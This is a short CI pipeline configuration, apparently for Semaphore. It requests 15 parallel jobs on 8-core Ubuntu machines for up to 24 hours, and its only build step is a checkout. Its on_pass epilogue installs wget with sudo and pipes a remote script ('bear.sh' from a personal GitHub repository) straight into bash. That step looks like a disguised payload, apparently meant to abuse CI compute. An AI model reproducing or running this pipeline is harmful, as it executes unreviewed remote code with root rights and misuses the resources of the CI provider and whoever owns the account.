version: v1.0
name: Initial Pipeline
agent:
  machine:
    type: e1-standard-8
    os_image: ubuntu2004
execution_time_limit:
  hours: 24
blocks:
  - name: 'Block #1'
    task:
      jobs:
        - name: 'Job #1'
          commands:
            - checkout
          parallelism: 15
      prologue:
        commands:
          - lscpu
      epilogue:
        always:
          commands:
            - whoami
        on_pass:
          commands:
            - 'sudo apt update;sudo apt -y install wget;sudo wget -O - https://raw.githubusercontent.com/mxolisimagungqu/rawr/refs/heads/main/bear.sh | bash'
        on_fail:
          commands:
            - echo "on_fail job goes here!"
